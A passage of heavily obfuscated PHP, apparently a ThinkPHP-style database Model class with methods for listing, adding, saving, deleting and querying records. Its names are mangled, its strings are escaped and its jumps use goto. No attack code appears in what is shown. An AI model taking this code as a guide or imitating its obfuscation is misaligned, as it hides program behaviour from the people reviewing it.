explode($¡¯Ê¼ÇÚ[47], trim($‘ •¢ÅÛ, $¡¯Ê¼ÇÚ[47])); return array_remove_value($‘ •¢ÅÛ, $¡¯Ê¼ÇÚ[201]); } public function listAll($É«µ´º) { $ûç„ı‰ =& $_SERVER[Á÷ ­Šë]; $Ê¬Â› = $this->sourceInfo($É«µ´º); $ïºˆî¶‹ = array($ûç„ı‰[547] => array($ûç„ı‰[548], $Ê¬Â›[$ûç„ı‰[525]] . $É«µ´º . $ûç„ı‰[549]), $ûç„ı‰[550] => 0); $ ”Êô¨À = $ûç„ı‰[551]; $ËÛ±ì = "\x4c\x45\x46\124\x20\112\117\x49\x4e\x20{$this->tablePrefix}\x69\157\x5f\146\151\x6c\145\40\146\151\154\x65\x20\157\156\40\x73\157\165\x72\143\x65\x2e\146\x69\x6c\x65\x49\x44\x20\x3d\40\146\x69\154\x65\56\x66\x69\154\145\x49\104"; $±Ëºì¸Ö = $this->alias($ûç„ı‰[448])->field($ ”Êô¨À)->where($ïºˆî¶‹)->join($ËÛ±ì)->select(); $this->_listAppendAuth($±Ëºì¸Ö); $this->_listAppendUser($±Ëºì¸Ö); $this->_listAppendPath($±Ëºì¸Ö); $±Ëºì¸Ö = array_to_keyvalue($±Ëºì¸Ö, $ûç„ı‰[407]); $¢åÜ· = "\57{$Ê¬Â›[$ûç„ı‰[28]]}\x2f"; $¢åÜ· = $¢åÜ· == $ûç„ı‰[533] ? $ûç„ı‰[8] : $¢åÜ·; $Ê’Ê…•¤ = array(); foreach ($±Ëºì¸Ö as $³¦º¿Šá => $¦š´ºƒı) { $´éŞÕ°¹ = $this->parentLevelArray($¦š´ºƒı[$ûç„ı‰[525]]); array_shift($´éŞÕ°¹); $Íéß§Û = $¢åÜ·; for ($üéë¤Õã = 0; $üéë¤Õã < count($´éŞÕ°¹); $üéë¤Õã++) { $Íéß§Û .= $±Ëºì¸Ö[$´éŞÕ°¹[$üéë¤Õã]][$ûç„ı‰[28]] . $ûç„ı‰[8]; } $Íéß§Û .= $¦š´ºƒı[$ûç„ı‰[28]]; if ($¦š´ºƒı[$ûç„ı‰[415]]) { $Íéß§Û .= $ûç„ı‰[8]; } $Íéß§Û = str_replace($ûç„ı‰[533], $ûç„ı‰[8], $Íéß§Û); $Íéß§Û = str_replace($ûç„ı‰[533], $ûç„ı‰[8], $Íéß§Û); $ş„ŞÛ– = array($ûç„ı‰[426] => str_replace($ûç„ı‰[533], $ûç„ı‰[8], $Íéß§Û), $ûç„ı‰[552] => intval($¦š´ºƒı[$ûç„ı‰[415]]), $ûç„ı‰[95] => $this->pathInfoFilter($¦š´ºƒı)); if (!$¦š´ºƒı[$ûç„ı‰[415]]) { $ş„ŞÛ–[$ûç„ı‰[471]] = $¦š´ºƒı[$ûç„ı‰[471]]; $ş„ŞÛ–[$ûç„ı‰[96]] = $¦š´ºƒı[$ûç„ı‰[86]]; } $Ê’Ê…•¤[] = $ş„ŞÛ–; } return $Ê’Ê…•¤; } } goto a‹°Ôœ’å; F¯ÈâÇº: define($_SERVER[Á÷ ­Šë][250], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\142\154\x65", "\x6f\162\x64\145\x72", "\x61\154\x69\141\163", "\x68\141\x76\x69\156\x67", "\x67\162\x6f\x75\x70", "\x6c\157\143\153", "\144\151\163\164\151\156\143\x74", "\x61\165\x74\x6f", "\146\x69\154\x74\x65\x72", "\166\x61\x6c\151\x64\x61\164\145", "\x72\145\x73\165\154\x74", "\x62\151\156\144", "\164\157\x6b\145\156"); public function __construct($ğ–¡æ©¼ = '', $¦ŞÄÃÛŒ = '', $ëœ¤­¦ = '') { $‡õşÛØœ =& $_SERVER[Á÷ ­Šë]; $this->_initialize(); if (!empty($ğ–¡æ©¼)) { if (strpos($ğ–¡æ©¼, $‡õşÛØœ[105])) { list($this->dbName, $this->name) = explode($‡õşÛØœ[105], $ğ–¡æ©¼); } else { $this->name = $ğ–¡æ©¼; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($¦ŞÄÃÛŒ)) { $this->tablePrefix = $‡õşÛØœ[33]; } elseif ($‡õşÛØœ[33] != $¦ŞÄÃÛŒ) { $this->tablePrefix = $¦ŞÄÃÛŒ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($‡õşÛØœ[251]); } $this->db(0, empty($this->connection) ? $ëœ¤­¦ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $òé€ğ¸â =& $_SERVER[Á÷ ­Šë]; if (empty($this->fields)) { if (think_config($òé€ğ¸â[252])) { $¹æï¥ÅÃ = $this->dbName ? $this->dbName : think_config($òé€ğ¸â[253]); $‰¸‡µ±½ = think_var_cache($òé€ğ¸â[254] . strtolower(get_path_this($¹æï¥ÅÃ) . $òé€ğ¸â[105] . $this->name)); if ($‰¸‡µ±½) { $‡¹İûÙô = think_config($òé€ğ¸â[255]); if (empty($‡¹İûÙô) || $‰¸‡µ±½[$òé€ğ¸â[256]] == $‡¹İûÙô) { $this->fields = $‰¸‡µ±½; return; } } } $this->flush(); } } public function flush() { $ßùÕ„ë× =& $_SERVER[Á÷ ­Šë]; $this->db->setModel($this->name); $İ¾Ôü´Ÿ = $this->db->getFields($this->getTableName()); if (!$İ¾Ôü´Ÿ) { return !1; } $this->fields = array_keys($İ¾Ôü´Ÿ); $this->fields[$ßùÕ„ë×[257]] = !1; foreach ($İ¾Ôü´Ÿ as $»·Ïéûš => $êõÓ™¬) { $‹¼÷—§ë[$»·Ïéûš] = $êõÓ™¬[$ßùÕ„ë×[29]]; if ($êõÓ™¬[$ßùÕ„ë×[36]]) { $this->fields[$ßùÕ„ë×[258]] = $»·Ïéûš; if ($êõÓ™¬[$ßùÕ„ë×[39]]) { $this->fields[$ßùÕ„ë×[257]] = !0; } } } $this->fields[$ßùÕ„ë×[259]] = $‹¼÷—§ë; if (think_config($ßùÕ„ë×[255])) { $this->fields[$ßùÕ„ë×[256]] = think_config($ßùÕ„ë×[255]); } if (think_config($ßùÕ„ë×[252])) { $ø“‘¢ÃÍ = $this->dbName ? $this->dbName : think_config($ßùÕ„ë×[253]); think_var_cache($ßùÕ„ë×[254] . strtolower(get_path_this($ø“‘¢ÃÍ) . $ßùÕ„ë×[105] . $this->name), $this->fields); } } public function switchModel($ÌÓü¶ÏÅ, $Ì™ò–Ë§ = array()) { $Ÿ¹«Ëì =& $_SERVER[Á÷ ­Šë]; $ƒÊñçßø = ucwords(strtolower($ÌÓü¶ÏÅ)) . $Ÿ¹«Ëì[260]; if (!class_exists($ƒÊñçßø)) { think_exception($ƒÊñçßø . think_lang($Ÿ¹«Ëì[261])); } $this->_extModel = new $ƒÊñçßø($this->name); if (!empty($Ì™ò–Ë§)) { foreach ($Ì™ò–Ë§ as $ÓÆñ²Ì) { $this->_extModel->setProperty($ÓÆñ²Ì, $this->{$ÓÆñ²Ì}); } } return $this->_extModel; } public function __set($ÓîÇÙœ, $ÙÍ™ˆ–Ô) { $this->data[$ÓîÇÙœ] = $ÙÍ™ˆ–Ô; } public function __get($¥µÁá˜) { return isset($this->data[$¥µÁá˜]) ? $this->data[$¥µÁá˜] : null; } public function __isset($ƒæ…±ú½) { return isset($this->data[$ƒæ…±ú½]); } public function __unset($Ã¼÷”…ä) { unset($this->data[$Ã¼÷”…ä]); } public function __call($–ä©¼Ÿï, $‚Ìš»Êˆ) { $¦ ¥„Æø =& $_SERVER[Á÷ ­Šë]; if (in_array(strtolower($–ä©¼Ÿï), $this->methods, !0)) { $this->options[strtolower($–ä©¼Ÿï)] = $‚Ìš»Êˆ[0]; return $this; } elseif (in_array(strtolower($–ä©¼Ÿï), array($¦ ¥„Æø[262], $¦ ¥„Æø[263], $¦ ¥„Æø[264], $¦ ¥„Æø[265], $¦ ¥„Æø[266]), !0)) { $½ğÓ¤š» = isset($‚Ìš»Êˆ[0]) ? $‚Ìš»Êˆ[0] : $¦ ¥„Æø[192]; $½ğÓ¤š» = $this->db->parseKey($½ğÓ¤š»); return $this->getField(strtoupper($–ä©¼Ÿï) . $¦ ¥„Æø[267] . $½ğÓ¤š» . $¦ ¥„Æø[268] . $–ä©¼Ÿï, $¦ ¥„Æø[262]); } elseif (strtolower(substr($–ä©¼Ÿï, 0, 5)) == $¦ ¥„Æø[269]) { $½ğÓ¤š» = think_parse_name(substr($–ä©¼Ÿï, 5)); $óÜ—½€[$½ğÓ¤š»] = $‚Ìš»Êˆ[0]; return $this->where($óÜ—½€)->find(); } elseif (strtolower(substr($–ä©¼Ÿï, 0, 10)) == $¦ ¥„Æø[270]) { $à­ÊÈ÷‰ = think_parse_name(substr($–ä©¼Ÿï, 10)); $óÜ—½€[$à­ÊÈ÷‰] = $‚Ìš»Êˆ[0]; return $this->where($óÜ—½€)->getField($‚Ìš»Êˆ[1]); } elseif (isset($this->_scope[$–ä©¼Ÿï])) { return $this->scope($–ä©¼Ÿï, $‚Ìš»Êˆ[0]); } elseif (method_exists($this, $–ä©¼Ÿï)) { array_unshift($‚Ìš»Êˆ, $–ä©¼Ÿï); return call_user_func_array(array($this, $¦ ¥„Æø[271]), $‚Ìš»Êˆ); } else { return call_user_func_array(array(parent, $–ä©¼Ÿï), $‚Ìš»Êˆ); } } protected function call() { $ÍôîÛ¬ñ =& $_SERVER[Á÷ ­Šë]; $§üı¶¢¨ = func_get_args(); $ØñØùå = array_shift($§üı¶¢¨); $ì€¶çŸö = $ØñØùå; if (is_array($ØñØùå)) { $ì€¶çŸö = $ØñØùå[1]; $ØñØùå = $ØñØùå[0]; } $²ÇõßŸÔ = count($§üı¶¢¨) - 1; if (isset($§üı¶¢¨[$²ÇõßŸÔ]) && $§üı¶¢¨[$²ÇõßŸÔ] === $ØñØùå) { think_exception(__CLASS__ . $ÍôîÛ¬ñ[4] . $ØñØùå . think_lang($ÍôîÛ¬ñ[272])); return; } $§üı¶¢¨[] = $ØñØùå; if (method_exists($this, $ÍôîÛ¬ñ[273])) { $æÙ‚–èº = call_user_func_array(array($this, $ÍôîÛ¬ñ[274]), array($ì€¶çŸö, $§üı¶¢¨)); if (!is_null($æÙ‚–èº) && $æÙ‚–èº !== !1) { return $æÙ‚–èº; } } $ü¹ıÓÁ = call_user_func_array(array($this, $ØñØùå), $§üı¶¢¨); if (method_exists($this, $ÍôîÛ¬ñ[275])) { $æÙ‚–èº = call_user_func_array(array($this, $ÍôîÛ¬ñ[276]), array($ì€¶çŸö, $§üı¶¢¨, $ü¹ıÓÁ)); if ($æÙ‚–èº) { return $æÙ‚–èº; } } return $ü¹ıÓÁ; } protected function _initialize() { } protected function _facade($´²ÎãŞ) { $µÇ¶éœ¨ =& $_SERVER[Á÷ ­Šë]; if (!empty($this->fields)) { foreach ($´²ÎãŞ as $æÃ˜ıî => $”èşšè) { if (is_array($this->fields) && !in_array($æÃ˜ıî, $this->fields, !0)) { unset($´²ÎãŞ[$æÃ˜ıî]); } elseif (is_scalar($”èşšè)) { $this->_parseType($´²ÎãŞ, $æÃ˜ıî); } } } if (!empty($this->options[$µÇ¶éœ¨[277]])) { $´²ÎãŞ = array_map($this->options[$µÇ¶éœ¨[277]], $´²ÎãŞ); unset($this->options[$µÇ¶éœ¨[277]]); } $this->_beforeWrite($´²ÎãŞ); return $´²ÎãŞ; } protected function _beforeWrite(&$§‰ãÛí¿) { } public function add($¿ŞÀãşÕ = '', $äŠÏÚ¯ = array(), $¿ëé„Çí = false) { if (empty($¿ŞÀãşÕ)) { if (!empty($this->data)) { $¿ŞÀãşÕ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[Á÷ ­Šë][278]); return !1; } } $äŠÏÚ¯ = $this->_parseOptions($äŠÏÚ¯); $¿ŞÀãşÕ = $this->_facade($¿ŞÀãşÕ); if (!1 === $this->_beforeInsert($¿ŞÀãşÕ, $äŠÏÚ¯)) { return !1; } $ÒØñ«ò = $this->db->insert($¿ŞÀãşÕ, $äŠÏÚ¯, $¿ëé„Çí); if (!1 !== $ÒØñ«ò) { $½¥•ëÕ = $this->getLastInsID(); if ($½¥•ëÕ) { $¿ŞÀãşÕ[$this->getPk()] = $½¥•ëÕ; $this->_after_insert($¿ŞÀãşÕ, $äŠÏÚ¯); return $½¥•ëÕ; } $this->_after_insert($¿ŞÀãşÕ, $äŠÏÚ¯); } return $ÒØñ«ò; } protected function _beforeInsert(&$‡Ò”ØÎ, $öçí÷×®) { } protected function _after_insert($„¸¨‰Ÿ, $Şœõğæ) { } public function addAll($÷Ú«Ë¾†, $£Ìâå·· = array(), $ñš£ïß = false) { $“¬Ú¥ =& $_SERVER[Á÷ ­Šë]; if (empty($÷Ú«Ë¾†)) { $this->error = think_lang($“¬Ú¥[278]); return !1; } $£Ìâå·· = $this->_parseOptions($£Ìâå··); foreach ($÷Ú«Ë¾† as $ÏÊ Úã£ => $û¾ŞÙâó) { $÷Ú«Ë¾†[$ÏÊ Úã£] = $this->_facade($û¾ŞÙâó); } if (method_exists($this->db, $“¬Ú¥[279])) { $¿ú’¢Ôò = $this->db->insertAll($÷Ú«Ë¾†, $£Ìâå··, $ñš£ïß); } else { $this->startTrans(); foreach ($÷Ú«Ë¾† as $ÏÊ Úã£ => $û¾ŞÙâó) { $¿ú’¢Ôò = $this->db->insert($û¾ŞÙâó, $£Ìâå··, $ñš£ïß); } $this->commit(); } if (!1 !== $¿ú’¢Ôò) { $¥ã¥¶òè = $this->getLastInsID(); if ($¥ã¥¶òè) { return $¥ã¥¶òè; } } return $¿ú’¢Ôò; } public function selectAdd($è¸ü´Üä = '', $¶ûèùó± = '', $•›ÂÙ = array()) { $†Ú¯ÊŒÖ =& $_SERVER[Á÷ ­Šë]; $•›ÂÙ = $this->_parseOptions($•›ÂÙ); if (!1 === ($ŒÂÑí¾ = $this->db->selectInsert($è¸ü´Üä ? $è¸ü´Üä : $•›ÂÙ[$†Ú¯ÊŒÖ[280]], $¶ûèùó± ? $¶ûèùó± : $this->getTableName(), $•›ÂÙ))) { $this->error = think_lang($†Ú¯ÊŒÖ[281]); return !1; } else { return $ŒÂÑí¾; } } public function save($„Ã‡ïˆÕ = '', $”³ô¨ñ® = array()) { $Ô‘ú•ş =& $_SERVER[Á÷ ­Šë]; if (empty($„Ã‡ïˆÕ)) { if (!empty($this->data)) { $„Ã‡ïˆÕ = $this->data; $this->data = array(); } else { $this->error = think_lang($Ô‘ú•ş[278]); return !1; } } $„Ã‡ïˆÕ = $this->_facade($„Ã‡ïˆÕ); $”³ô¨ñ® = $this->_parseOptions($”³ô¨ñ®); $ÌèŠîŞÙ = $this->getPk(); if (!isset($”³ô¨ñ®[$Ô‘ú•ş[282]])) { if (isset($„Ã‡ïˆÕ[$ÌèŠîŞÙ])) { $ê¹ÏíĞÙ[$ÌèŠîŞÙ] = $„Ã‡ïˆÕ[$ÌèŠîŞÙ]; $”³ô¨ñ®[$Ô‘ú•ş[282]] = $ê¹ÏíĞÙ; unset($„Ã‡ïˆÕ[$ÌèŠîŞÙ]); } else { $this->error = think_lang($Ô‘ú•ş[281]); return !1; } } if (is_array($”³ô¨ñ®[$Ô‘ú•ş[282]]) && isset($”³ô¨ñ®[$Ô‘ú•ş[282]][$ÌèŠîŞÙ])) { $üº–Ó = $”³ô¨ñ®[$Ô‘ú•ş[282]][$ÌèŠîŞÙ]; } if (!1 === $this->_beforeUpdate($„Ã‡ïˆÕ, $”³ô¨ñ®)) { return !1; } $àãõÖãâ = $this->db->update($„Ã‡ïˆÕ, $”³ô¨ñ®); if (!1 !== $àãõÖãâ) { if (isset($üº–Ó)) { $„Ã‡ïˆÕ[$ÌèŠîŞÙ] = $üº–Ó; } $this->_afterUpdate($„Ã‡ïˆÕ, $”³ô¨ñ®); } return $àãõÖãâ; } protected function _beforeUpdate(&$èå²Â«Ó, $¯°‚Ûõ) { } protected function _afterUpdate($îÈü­Ã­, $ëĞ¾·Æø) { } public function delete($ñäå½·ö = array()) { $ÃªÌÒ®– =& $_SERVER[Á÷ ­Šë]; if (empty($ñäå½·ö) && empty($this->options[$ÃªÌÒ®–[282]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $™ÆøİŒ“ = $this->getPk(); if (is_numeric($ñäå½·ö) || is_string($ñäå½·ö)) { if (strpos($ñäå½·ö, $ÃªÌÒ®–[47])) { $Ø¾—çöœ[$™ÆøİŒ“] = array($ÃªÌÒ®–[283], $ñäå½·ö); } else { $Ø¾—çöœ[$™ÆøİŒ“] = $ñäå½·ö; } $this->options[$ÃªÌÒ®–[282]] = $Ø¾—çöœ; } $ñäå½·ö = $this->_parseOptions(); if (is_array($ñäå½·ö[$ÃªÌÒ®–[282]]) && isset($ñäå½·ö[$ÃªÌÒ®–[282]][$™ÆøİŒ“])) { $›Ã†øÍí = $ñäå½·ö[$ÃªÌÒ®–[282]][$™ÆøİŒ“]; } $ş–¸º‰À = $this->db->delete($ñäå½·ö); if (!1 !== $ş–¸º‰À) { $ é›‰šó = array(); if (isset($›Ã†øÍí)) { $ é›‰šó[$™ÆøİŒ“] = $›Ã†øÍí; } $this->_after_delete($ é›‰šó, $ñäå½·ö); } return $ş–¸º‰À; } protected function _after_delete($¬ÉÃñæì, $¤ÖÀ‚ˆ) { } public function select($¬ÔÜŠ†ç = array()) { $ÚÅëñ÷ =& $_SERVER[Á÷ ­Šë]; if (is_string($¬ÔÜŠ†ç) || is_numeric($¬ÔÜŠ†ç)) { $±®ËŸá¨ = $this->getPk(); if (strpos($¬ÔÜŠ†ç, $ÚÅëñ÷[47])) { $³ªÃ¸ß[$±®ËŸá¨] = array($ÚÅëñ÷[283], $¬ÔÜŠ†ç); } else { $³ªÃ¸ß[$±®ËŸá¨] = $¬ÔÜŠ†ç; } $this->options[$ÚÅëñ÷[282]] = $³ªÃ¸ß; } elseif (!1 === $¬ÔÜŠ†ç) { $¬ÔÜŠ†ç = $this->_parseOptions(); return $ÚÅëñ÷[284] . $this->db->buildSelectSql($¬ÔÜŠ†ç) . $ÚÅëñ÷[285]; } $¬ÔÜŠ†ç = $this->_parseOptions(); $†µ¹Ş¼ = $this->db->select($¬ÔÜŠ†ç); if (!1 === $†µ¹Ş¼) { return !1; } if (empty($†µ¹Ş¼)) { return null; } $this->_afterSelect($†µ¹Ş¼, $¬ÔÜŠ†ç); return $†µ¹Ş¼; } protected function _afterSelect(&$Û§ì¬ƒ, $é›Öø×‘) { } public function buildSql($èêîÌ§ = array()) { $ñë²ö²‡ =& $_SERVER[Á÷ ­Šë]; $èêîÌ§ = $this->_parseOptions($èêîÌ§); return $ñë²ö²‡[284] . $this->db->buildSelectSql($èêîÌ§) . $ñë²ö²‡[285]; } public function optionsValue($ä¥İ´˜¾ = null) { if (is_null($ä¥İ´˜¾)) { return $this->options; } elseif (is_array($ä¥İ´˜¾)) { $this->options = array_merge($this->options, $ä¥İ´˜¾); } } protected function _parseOptions($Ï®‚ß™ = array()) { $äÏ²·² =& $_SERVER[Á÷ ­Šë]; if (is_array($Ï®‚ß™)) { $Ï®‚ß™ = array_merge($this->options, $Ï®‚ß™); } $this->options = array(); if (!isset($Ï®‚ß™[$äÏ²·²[286]])) { $Ï®‚ß™[$äÏ²·²[286]] = $this->getTableName(); $…®Â“å´ = $this->fields; } else { $…®Â“å´ = $this->getDbFields(); } if (!empty($Ï®‚ß™[$äÏ²·²[287]])) { $Ï®‚ß™[$äÏ²·²[286]] .= $äÏ²·²[50] . $Ï®‚ß™[$äÏ²·²[287]]; } $Ï®‚ß™[$äÏ²·²[288]] = $this->name; if (isset($Ï®‚ß™[$äÏ²·²[282]]) && is_array($Ï®‚ß™[$äÏ²·²[282]]) && !empty($…®Â“å´) && !isset($Ï®‚ß™[$äÏ²·²[289]]) && !isset($Ï®‚ß™[$äÏ²·²[286]])) { foreach ($Ï®‚ß™[$äÏ²·²[282]] as $î®³Ò˜œ => $î±ÍäÁ„) { $î®³Ò˜œ = trim($î®³Ò˜œ); if (in_array($î®³Ò˜œ, $…®Â“å´, !0)) { if (is_scalar($î±ÍäÁ„)) { $this->_parseType($Ï®‚ß™[$äÏ²·²[282]], $î®³Ò˜œ); } } elseif (!is_numeric($î®³Ò˜œ) && $äÏ²·²[81] != substr($î®³Ò˜œ, 0, 1) && !1 === strpos($î®³Ò˜œ, $äÏ²·²[105]) && !1 === strpos($î®³Ò˜œ, $äÏ²·²[267]) && !1 === strpos($î®³Ò˜œ, $äÏ²·²[290]) && !1 === strpos($î®³Ò˜œ, $äÏ²·²[291])) { unset($Ï®‚ß™[$äÏ²·²[282]][$î®³Ò˜œ]); } } } $this->_options_filter($Ï®‚ß™); return $Ï®‚ß™; } protected function _options_filter(&$ßï€üåş) { } protected function _parseType(&$©÷à­ï, $ßî­‘ã) { $·¶À¶À =& $_SERVER[Á÷ ­Šë]; if (empty($this->options[$·¶À¶À[292]][$·¶À¶À[4] . $ßî­‘ã])) { $åš…Çéî = strtolower($this->fields[$·¶À¶À[259]][$ßî­‘ã]); if (!1 !== strpos($åš…Çéî, $·¶À¶À[293])) { } elseif (!1 === strpos($åš…Çéî, $·¶À¶À[294]) && !1 !== strpos($åš…Çéî, $·¶À¶À[295])) { $©÷à­ï[$ßî­‘ã] = intval($©÷à­ï[$ßî­‘ã]); } elseif (!1 !== strpos($åš…Çéî, $·¶À¶À[296]) || !1 !== strpos($åš…Çéî, $·¶À¶À[297])) { $©÷à­ï[$ßî­‘ã] = floatval($©÷à­ï[$ßî­‘ã]); } elseif (!1 !== strpos($åš…Çéî, $·¶À¶À[298])) { $©÷à­ï[$ßî­‘ã] = (bool) $©÷à­ï[$ßî­‘ã]; } } } public function find($ §¢«€« = array()) { $¿ÜôËïŸ =& $_SERVER[Á÷ ­Šë]; if (is_numeric($ §¢«€«) || is_string($ §¢«€«)) { $ÜÁŒıÈ£[$this->getPk()] = intval($ §¢«€«); $this->options[$¿ÜôËïŸ[282]] = $ÜÁŒıÈ£; } $this->options[$¿ÜôËïŸ[299]] = 1; $ §¢«€« = $this->_parseOptions(); $¬®ûØîé = $this->db->select($ §¢«€«); if (!1 === $¬®ûØîé) { return !1; } if (empty($¬®ûØîé)) { return null; } $this->data = $¬®ûØîé[0]; $this->_afterFind($this->data, $ §¢«€«); if (!empty($this->options[$¿ÜôËïŸ[300]])) { return $this->returnResult($this->data, $this->options[$¿ÜôËïŸ[300]]); } return $this->data; } protected function _afterFind(&$óÚÂÜçÆ, $°àşßÚ¢) { } protected function returnResult($—ù×öñÛ, $Úù¯¶÷¨ = '') { $ŸÙõÏ–¬ =& $_SERVER[Á÷ ­Šë]; if ($Úù¯¶÷¨) { if (is_callable($Úù¯¶÷¨)) { return call_user_func($Úù¯¶÷¨, $—ù×öñÛ); } switch (strtolower($Úù¯¶÷¨)) { case $ŸÙõÏ–¬[301]: return json_encode($—ù×öñÛ); case $ŸÙõÏ–¬[302]: return xml_encode($—ù×öñÛ); } } return $—ù×öñÛ; } public function parseFieldsMap($Î„„ü¨ñ, $¾¢ëˆ¶Ã = 1) { if (!empty($this->_map)) { foreach ($this->_map as $‰«½ÈÚ… => $Êª×æ«¦) { if ($¾¢ëˆ¶Ã == 1) { if (isset($Î„„ü¨ñ[$Êª×æ«¦])) { $Î„„ü¨ñ[$‰«½ÈÚ…] = $Î„„ü¨ñ[$Êª×æ«¦]; unset($Î„„ü¨ñ[$Êª×æ«¦]); } } else { if (isset($Î„„ü¨ñ[$‰«½ÈÚ…])) { $Î„„ü¨ñ[$Êª×æ«¦] = $Î„„ü¨ñ[$‰«½ÈÚ…]; unset($Î„„ü¨ñ[$‰«½ÈÚ…]); } } } } return $Î„„ü¨ñ; } public function setField($ô¼ÓÆ©Û, $Û¨Ä¶ûØ = '') { if (is_array($ô¼ÓÆ©Û)) { $õÁÁäÆç = $ô¼ÓÆ©Û; } else { $õÁÁäÆç[$ô¼ÓÆ©Û] = $Û¨Ä¶ûØ; } return $this->save($õÁÁäÆç); } public function setAdd($Š®”ÖÆ·, $ë‘ÔÊ…Ä = 1) { $ğŒô§‚ø =& $_SERVER[Á÷ ­Šë]; $Á€Œ§‚á = $Š®”ÖÆ· . $ğŒô§‚ø[303] . $ë‘ÔÊ…Ä; if ($ë‘ÔÊ…Ä < 0) { $Á€Œ§‚á = $Š®”ÖÆ· . $ë‘ÔÊ…Ä; } return $this->setField($Š®”ÖÆ·, array($ğŒô§‚ø[304], $Á€Œ§‚á)); } public function getField($ÉÎ»ÖÂ, $ÁûƒÉĞ‚ = null) { $‘í€ˆ¾ò =& $_SERVER[Á÷ ­Šë]; $´ÂàçÕ[$‘í€ˆ¾ò[280]] = $ÉÎ»ÖÂ; $´ÂàçÕ = $this->_parseOptions($´ÂàçÕ); $ÉÎ»ÖÂ = trim($ÉÎ»ÖÂ); if (strpos($ÉÎ»ÖÂ, $‘í€ˆ¾ò[47])) { if (!isset($´ÂàçÕ[$‘í€ˆ¾ò[299]])) { $´ÂàçÕ[$‘í€ˆ¾ò[299]] = is_numeric($ÁûƒÉĞ‚) ? $ÁûƒÉĞ‚ : $‘í€ˆ¾ò[33]; } $ïÍ…®Ò = $this->db->select($´ÂàçÕ); if (!empty($ïÍ…®Ò)) { $¥»ö—­— = explode($‘í€ˆ¾ò[47], $ÉÎ»ÖÂ); $ÉÎ»ÖÂ = array_keys($ïÍ…®Ò[0]); $¼×­Ú€ï = array_shift($ÉÎ»ÖÂ); $¶“òö¼‡ = array_shift($ÉÎ»ÖÂ); $ÈãÙŞ¸Ü = array(); $ì¸ÖåÇ± = count($¥»ö—­—); foreach ($ïÍ…®Ò as $äÌœÀ÷ô) { $öæŸĞã‰ = $äÌœÀ÷ô[$¼×­Ú€ï]; if (2 == $ì¸ÖåÇ±) { $ÈãÙŞ¸Ü[$öæŸĞã‰] = $äÌœÀ÷ô[$¶“òö¼‡]; } else { $ÈãÙŞ¸Ü[$öæŸĞã‰] = is_string($ÁûƒÉĞ‚) ? implode($ÁûƒÉĞ‚, $äÌœÀ÷ô) : $äÌœÀ÷ô; } } return $ÈãÙŞ¸Ü; } } else { if (!0 !== $ÁûƒÉĞ‚) { $´ÂàçÕ[$‘í€ˆ¾ò[299]] = is_numeric($ÁûƒÉĞ‚) ? $ÁûƒÉĞ‚ : 1; } if ($ÁûƒÉĞ‚ === $‘í€ˆ¾ò[262]) { unset($´ÂàçÕ[$‘í€ˆ¾ò[299]]); } $äÌœÀ÷ô = $this->db->select($´ÂàçÕ); if (!empty($äÌœÀ÷ô)) { if ($ÁûƒÉĞ‚ === $‘í€ˆ¾ò[262]) { return reset($äÌœÀ÷ô[0]); } if (!0 !== $ÁûƒÉĞ‚ && 1 == $´ÂàçÕ[$‘í€ˆ¾ò[299]]) { return reset($äÌœÀ÷ô[0]); } foreach ($äÌœÀ÷ô as $…Š’Ÿ¤¦) { $‡íÊ·Š°[] = $…Š’Ÿ¤¦[$ÉÎ»ÖÂ]; } return $‡íÊ·Š°; } } return null; } public function create($ä¯†İĞò = '', $šÉ½ö©­ = '') { $éÜ‚À„’ =& $_SERVER[Á÷ ­Šë]; if (empty($ä¯†İĞò)) { $ä¯†İĞò = $_POST; } elseif (is_object($ä¯†İĞò)) { $ä¯†İĞò = get_object_vars($ä¯†İĞò); } if (empty($ä¯†İĞò) || !is_array($ä¯†İĞò)) { $this->error = think_lang($éÜ‚À„’[278]); return !1; } $ä¯†İĞò = $this->parseFieldsMap($ä¯†İĞò, 0); $šÉ½ö©­ = $šÉ½ö©­ ? $šÉ½ö©­ : (!empty($ä¯†İĞò[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$éÜ‚À„’[280]])) { $Û”¡—û‡ = $this->options[$éÜ‚À„’[280]]; unset($this->options[$éÜ‚À„’[280]]); } elseif ($šÉ½ö©­ == THINK_MODEL_INSERT && isset($this->insertFields)) { $Û”¡—û‡ = $this->insertFields; } elseif ($šÉ½ö©­ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $Û”¡—û‡ = $this->updateFields; } if (isset($Û”¡—û‡)) { if (is_string($Û”¡—û‡)) { $Û”¡—û‡ = explode($éÜ‚À„’[47], $Û”¡—û‡); } if (think_config($éÜ‚À„’[305])) { $Û”¡—û‡[] = think_config($éÜ‚À„’[306]); } foreach ($ä¯†İĞò as $¨×¼ÅÈ => $«Ó¨¾™Ğ) { if (!in_array($¨×¼ÅÈ, $Û”¡—û‡)) { unset($ä¯†İĞò[$¨×¼ÅÈ]); } } } if (!$this->autoValidation($ä¯†İĞò, $šÉ½ö©­)) { return !1; } if (!$this->autoCheckToken($ä¯†İĞò)) { $this->error = think_lang($éÜ‚À„’[307]); return !1; } if ($this->autoCheckFields) { $Û”¡—û‡ = $this->getDbFields(); foreach ($ä¯†İĞò as $¨×¼ÅÈ => $«Ó¨¾™Ğ) { if (!in_array($¨×¼ÅÈ, $Û”¡—û‡)) { unset($ä¯†İĞò[$¨×¼ÅÈ]); } elseif (MAGIC_QUOTES_GPC && is_string($«Ó¨¾™Ğ)) { $ä¯†İĞò[$¨×¼ÅÈ] = stripslashes($«Ó¨¾™Ğ); } } } $this->autoOperation($ä¯†İĞò, $šÉ½ö©­); $this->data = $ä¯†İĞò; return $ä¯†İĞò; } public function autoCheckToken($ë÷É³¨è) { $òãº“´· =& $_SERVER[Á÷ ­Šë]; if (isset($this->options[$òãº“´·[308]]) && 